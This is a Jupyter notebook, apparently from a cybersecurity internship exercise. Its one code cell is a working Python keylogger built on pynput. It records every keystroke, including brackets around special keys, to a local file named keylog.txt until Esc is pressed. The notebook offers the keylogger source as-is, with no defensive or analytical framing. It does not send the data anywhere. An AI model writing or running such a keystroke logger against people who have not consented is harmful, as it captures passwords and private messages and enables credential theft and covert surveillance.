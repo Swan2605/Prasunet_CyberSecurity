{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "151a8298-3d30-438b-b8e0-159affe20cdc",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pynput\n",
    "from pynput.keyboard import Key, Listener\n",
    "\n",
    "# Path to the file where keystrokes will be logged\n",
    "log_file = \"keylog.txt\"\n",
    "\n",
    "# Function to write the keystrokes to the log file\n",
    "def write_to_file(key):\n",
    "    with open(log_file, \"a\") as f:\n",
    "        if key == '\\n' or key == '\\t':\n",
    "            f.write(key)\n",
    "        elif key == 'Key.space':\n",
    "            f.write(' ')\n",
    "        else:\n",
    "            f.write(key)\n",
    "\n",
    "# Callback function when a key is pressed\n",
    "def on_press(key):\n",
    "    try:\n",
    "        write_to_file(key.char)\n",
    "    except AttributeError:\n",
    "        if key == Key.space:\n",
    "            write_to_file(' ')\n",
    "        elif key == Key.enter:\n",
    "            write_to_file('\\n')\n",
    "        elif key == Key.tab:\n",
    "            write_to_file('\\t')\n",
    "        else:\n",
    "            write_to_file('[' + str(key) + ']')  # Log special keys with brackets\n",
    "\n",
    "# Callback function when a key is released\n",
    "def on_release(key):\n",
    "    if key == Key.esc:\n",
    "        # Stop listener\n",
    "        return False\n",
    "\n",
    "# Start listening to keyboard events\n",
    "with Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e3230d34-0c0d-4d94-8ff2-783089c5ea37",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
